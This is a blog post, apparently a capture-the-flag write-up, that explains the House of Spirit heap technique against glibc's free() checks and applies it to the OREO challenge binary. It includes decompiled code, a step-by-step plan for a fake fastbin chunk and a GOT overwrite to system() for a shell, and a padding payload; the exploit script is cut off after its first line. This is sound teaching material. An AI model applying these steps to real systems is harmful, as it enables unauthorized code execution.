<!DOCTYPE html>

<!--
  portfolYOU Jekyll theme by Youssef Raafat
  Free for personal and commercial use under the MIT license
  https://github.com/YoussefRaafatNasry/portfolYOU
-->

<html lang="en" class="h-100">

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content=""循此苦旅，以达星辰"">

  <title>Yvan's blog</title>
  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">

  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">

  <!-- Bootstrap CSS CDN -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">

  <!-- Animate CSS CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css" type="text/css"/>
  
  <!-- Custom CSS -->
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css">

  <!-- Mathjax for latex -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>

  <!-- comment system -->
  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>

</head>


<body class="d-flex flex-column h-100">

  <main class="flex-shrink-0 container mt-5">
  <nav class="navbar navbar-expand-lg navbar-light">

  <a class="navbar-brand" href="/"><h5><b>Yvan's blog</b></h5></a>

  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>

      <a class="nav-item nav-link active" href="/blog/">Blog</a>

      <a class="nav-item nav-link " href="/link/">Link</a>

      <a class="nav-item nav-link " href="/about/">About</a>

      <a class="nav-item nav-link " href="/about_en/">AboutEN</a>

      

    </div>
  </div>

</nav>
  <div class="col-lg-10 mx-auto mt-5 post">
  <h1><b>House of spirit</b></h1>

<p class="post-metadata text-muted">
  08 January 2020 -
  <b>14 mins read time</b>

  <br>Tags:
  
  <a class="text-decoration-none no-underline" href="/blog/tags#heapexploit">
    <span class="tag badge badge-pill text-primary border border-primary">HeapExploit</span>
  </a>
  
  <a class="text-decoration-none no-underline" href="/blog/tags#thinking">
    <span class="tag badge badge-pill text-primary border border-primary">thinking</span>
  </a>
  </p>

<h3 id="原理解释">原理解释</h3>
<p>  House of spirit是the malloc Maleficarum的一种技术。该技术的核心思想是伪造fastbin chunk并将其释放，从而达到分配任意地址的chunk的目的。
想要伪造fastbin fake chunk，主要需要绕过free时对其进行的检查：</p>

<ul>
  <li>fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，则会进行单独处理。</li>
  <li>fake chunk的地址需要对齐，MALLOC_ALIGN_MASK</li>
  <li>fake chunk的size大小需要满足fastbin的要求，也需要对齐</li>
  <li>fake chunk的nextchunk的大小不能小于2 * size_se，也不能大于av-&gt;system_mem</li>
  <li>fake chunk对应的fastbin head不能为该chunk，否则会触发double free</li>
</ul>

<p>相关源码如下：</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">((</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">p</span> <span class="o">&gt;</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="o">-</span><span class="n">size</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
      <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">misaligned_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): invalid pointer"</span><span class="p">);</span>
  <span class="cm">/* We know that each chunk is at least MINSIZE bytes in size or a
     multiple of MALLOC_ALIGNMENT.  */</span>
  
  <span class="c1">// 检查大小是否大于最小的chunk，是否对齐</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="n">MINSIZE</span> <span class="o">||</span> <span class="o">!</span><span class="n">aligned_OK</span> <span class="p">(</span><span class="n">size</span><span class="p">)))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): invalid size"</span><span class="p">);</span>

  <span class="n">check_inuse_chunk</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
  
  <span class="cm">/*
    If eligible, place chunk on a fastbin so it can be found
    and used quickly in malloc.
  */</span>
  <span class="c1">// 检查该chunk是否符合fastbin</span>
  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">get_max_fast</span> <span class="p">()))</span> <span class="p">{</span>

		<span class="c1">// 检查nextchunk的size是否小于最小chunk要求，或大于系统最大chunk</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span>
			  <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
	<span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span>
			     <span class="o">&gt;=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
      <span class="p">{</span>
	<span class="n">bool</span> <span class="n">fail</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
		<span class="cm">/* We might not have a lock at this point and concurrent modifications
	   of system_mem might result in a false positive.  Redo the test after
	   getting the lock.  */</span>
	  <span class="c1">// 检查是否有lock</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">have_lock</span><span class="p">)</span>
	  <span class="p">{</span>
	    <span class="n">__libc_lock_lock</span> <span class="p">(</span><span class="n">av</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
	    <span class="n">fail</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span>
		    <span class="o">||</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span> <span class="o">&gt;=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">);</span>
	    <span class="n">__libc_lock_unlock</span> <span class="p">(</span><span class="n">av</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
	  <span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">fail</span><span class="p">)</span>
	  <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): invalid next size (fast)"</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="c1">// 将chunk的mem部分设置为perturb_byte</span>
    <span class="n">free_perturb</span> <span class="p">(</span><span class="n">chunk2mem</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">size</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">);</span>
    
    <span class="c1">// 设置fastbin标记位</span>
    <span class="n">atomic_store_relaxed</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">av</span><span class="o">-&gt;</span><span class="n">have_fastchunks</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
    
    <span class="c1">// 获取对应fastbin的头指针</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">fastbin_index</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>

    <span class="cm">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span>
    <span class="c1">// 使用原子操作将该chunk插入其中</span>
    <span class="n">mchunkptr</span> <span class="n">old</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">,</span> <span class="n">old2</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
      <span class="p">{</span>
	<span class="cm">/* Check that the top of the bin is not the record we are going to
	   add (i.e., double free).  */</span>
  <span class="c1">// 检查上一次插入的chunk是否与p相同，若相同则为double free</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
	  <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"double free or corruption (fasttop)"</span><span class="p">);</span>
	<span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">old</span><span class="p">;</span>
	<span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="k">else</span>
      <span class="k">do</span>
	<span class="p">{</span>
	  <span class="cm">/* Check that the top of the bin is not the record we are going to
	     add (i.e., double free).  */</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
	    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"double free or corruption (fasttop)"</span><span class="p">);</span>
	  <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">old2</span> <span class="o">=</span> <span class="n">old</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">while</span> <span class="p">((</span><span class="n">old</span> <span class="o">=</span> <span class="n">catomic_compare_and_exchange_val_rel</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">old2</span><span class="p">))</span>
	     <span class="o">!=</span> <span class="n">old2</span><span class="p">);</span>

    <span class="cm">/* Check that size of fastbin chunk at the top is the same as
       size of the chunk that we are adding.  We can dereference OLD
       only if we have the lock, otherwise it might have already been
       allocated again.  */</span>
    <span class="c1">// 确保插入前后相同</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">have_lock</span> <span class="o">&amp;&amp;</span> <span class="n">old</span> <span class="o">!=</span> <span class="nb">NULL</span>
	<span class="o">&amp;&amp;</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">old</span><span class="p">))</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"invalid fastbin entry (free)"</span><span class="p">);</span>
  <span class="p">}</span>  
</code></pre></div></div>

<p>下面我们来做一道题看看</p>

<h3 id="oreo">OREO</h3>

<p>Basic Info：</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/work/pwn/fastbin/oreo/oreo'</span>
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></div></div>
<p>该程序的大概逻辑是这样的，这是一个枪支系统。枪支的结构体如下：</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000 rifle           struc <span class="p">;</span> <span class="o">(</span><span class="nv">sizeof</span><span class="o">=</span>0x38, mappedto_5<span class="o">)</span>
00000000 descript        db 25 dup<span class="o">(</span>?<span class="o">)</span>
00000019 name            db 27 dup<span class="o">(</span>?<span class="o">)</span>
00000034 prev            <span class="nb">dd</span> ?                    <span class="p">;</span> offset
00000038 rifle           ends
</code></pre></div></div>

<p>大概功能如下：</p>
<ol>
  <li>添加枪支功能</li>
</ol>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">add_rifles</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int32_t</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="n">undefined4</span> <span class="n">uVar2</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_10h</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_ch</span><span class="p">;</span>
    
    <span class="n">uVar2</span> <span class="o">=</span> <span class="n">_rifles_head</span><span class="p">;</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
    <span class="n">_rifles_head</span> <span class="o">=</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x38</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_rifles_head</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">puts</span><span class="p">(</span><span class="s">"Something terrible happened!"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">_rifles_head</span> <span class="o">+</span> <span class="mh">0x34</span><span class="p">)</span> <span class="o">=</span> <span class="n">uVar2</span><span class="p">;</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Rifle name: "</span><span class="p">);</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">fgets</span><span class="p">(</span><span class="n">_rifles_head</span> <span class="o">+</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="n">_section</span><span class="p">..</span><span class="n">bss</span><span class="p">);</span>
        <span class="n">add_End</span><span class="p">(</span><span class="n">_rifles_head</span> <span class="o">+</span> <span class="mh">0x19</span><span class="p">);</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Rifle description: "</span><span class="p">);</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">fgets</span><span class="p">(</span><span class="n">_rifles_head</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="n">_section</span><span class="p">..</span><span class="n">bss</span><span class="p">);</span>
        <span class="n">add_End</span><span class="p">(</span><span class="n">_rifles_head</span><span class="p">);</span>
        <span class="n">_rifles_counts</span> <span class="o">=</span> <span class="n">_rifles_counts</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// WARNING: Subroutine does not return</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">__stack_chk_fail</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>


</code></pre></div></div>
<p>大致流程是首先将rifles_head储存起来，然后分配一个新的chunk来储存rifles struct，把rifles_head存到0x34的位置把name存到0x19的位置，desc存到开始的位置，然后rifles_count(0x804a2a4)++.
这样以来rifles就形成了一条链表。</p>

<p>我们注意到name和desc读入的size都是0x38这里明显存在溢出。</p>

<blockquote>
  <p>其中add_End()函数是想字符串尾加一个‘\0’</p>
</blockquote>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">add_End</span><span class="p">(</span><span class="kt">int32_t</span> <span class="n">arg_8h</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int32_t</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">iVar2</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar3</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_1ch</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_10h</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_ch</span><span class="p">;</span>
    
    <span class="n">iVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
    <span class="n">iVar2</span> <span class="o">=</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">strlen</span><span class="p">(</span><span class="n">arg_8h</span><span class="p">);</span>
    <span class="n">pcVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">arg_8h</span> <span class="o">+</span> <span class="n">iVar2</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(((</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">arg_8h</span> <span class="o">&lt;=</span> <span class="n">pcVar3</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">*</span><span class="n">pcVar3</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">))</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">pcVar3</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// WARNING: Subroutine does not return</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">__stack_chk_fail</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>查看所有枪支</li>
</ol>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">show_added_rifles</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int32_t</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_14h</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_10h</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_ch</span><span class="p">;</span>
    
    <span class="n">iVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
    <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Rifle to be ordered:</span><span class="se">\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mh">0x8048bb0</span><span class="p">);</span>
    <span class="n">var_14h</span> <span class="o">=</span> <span class="n">_rifles_head</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">var_14h</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Name: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">var_14h</span> <span class="o">+</span> <span class="mh">0x19</span><span class="p">);</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Description: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">var_14h</span><span class="p">);</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">puts</span><span class="p">(</span><span class="mh">0x8048bb0</span><span class="p">);</span>
        <span class="n">var_14h</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">var_14h</span> <span class="o">+</span> <span class="mh">0x34</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// WARNING: Subroutine does not return</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">__stack_chk_fail</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>该函数会遍历rifles链表,然后打印name和desc</p>

<ol>
  <li>free所有的rifles</li>
</ol>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">order_rifles</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int32_t</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">iVar2</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_14h</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_10h</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_ch</span><span class="p">;</span>
    
    <span class="n">iVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
    <span class="n">var_14h</span> <span class="o">=</span> <span class="n">_rifles_head</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_rifles_counts</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">puts</span><span class="p">(</span><span class="s">"No rifles to be ordered!"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">var_14h</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">iVar2</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">var_14h</span> <span class="o">+</span> <span class="mh">0x34</span><span class="p">);</span>
            <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">free</span><span class="p">(</span><span class="n">var_14h</span><span class="p">);</span>
            <span class="n">var_14h</span> <span class="o">=</span> <span class="n">iVar2</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">_rifles_head</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">_order_counts</span> <span class="o">=</span> <span class="n">_order_counts</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">puts</span><span class="p">(</span><span class="s">"Okay order submitted!"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// WARNING: Subroutine does not return</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">__stack_chk_fail</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这里我们可以看到这个函数会free链表上所有的rifles结构，但是没有设置为NULL。</p>

<ol>
  <li>leave message</li>
</ol>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">leave_message</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int32_t</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">var_ch</span><span class="p">;</span>
    
    <span class="n">iVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
    <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Enter any notice you</span><span class="se">\'</span><span class="s">d like to submit with your order: "</span><span class="p">);</span>
    <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">fgets</span><span class="p">(</span><span class="n">_message</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="n">_section</span><span class="p">..</span><span class="n">bss</span><span class="p">);</span>
    <span class="n">add_End</span><span class="p">(</span><span class="n">_message</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// WARNING: Subroutine does not return</span>
        <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">__stack_chk_fail</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>这里会向*message(0x804a2a8 -&gt; 0x804a2c0)这里写入一段内容,因此我们可以想办法控制message所存储的指针来实现任意写的效果。</p>

<h4 id="利用思路">利用思路</h4>

<ol>
  <li>
    <p>首先，我们可以覆盖node -&gt; prev，把printf的got地址写入该字段，然后通过show_rifles函数泄漏printf的实际地址。</p>
  </li>
  <li>
    <ul>
      <li>我们可以在0x804a2a0处伪造一个chunk，由于一个rifle的大小为0x38，因此我们选择伪造size为0x41的fastbin chunk。这时我们发现0x804a2a4即rifles_count，这个值正好是chunk的size字段，因此我们可以在free这个chunk之前 add 0x41个rifles就可以控制其大小。</li>
      <li>但是这里还有一点需要注意，我们还需要修改下一个物理相邻chunk的size，我们算了一下偏移，0x804a2a0 + 0x40 = 0x804a2e0,这个地方就是next_chunk的size字段，我们可以通过leave_message()来覆盖这个字段，*message即0x804a2c0这里写入一段信息，我们计算一下偏移0x804a2e0 - 0x804a2c0 = 0x20 == 32. 再加上4个字节覆盖掉prev_size,因此一共输入36个字节的padding就能到达size字段。所以paload = ‘\x00’ * 36 + p32(0x41)</li>
      <li>这里之所以用\x00做padding是因为要把fake_chunk的prev设成null，否则free之后会出错。</li>
    </ul>
  </li>
  <li>最后，我们就重新分配rifle，获得刚刚伪造的chunk，然后覆盖message指针的地址，将其设置为strlen()函数的got地址，然后leave_message()用system()覆盖got表,即可getshell。</li>
</ol>

<p>到这里思路已经十分明确了，payload如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!  /usr/bin/env    python2
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

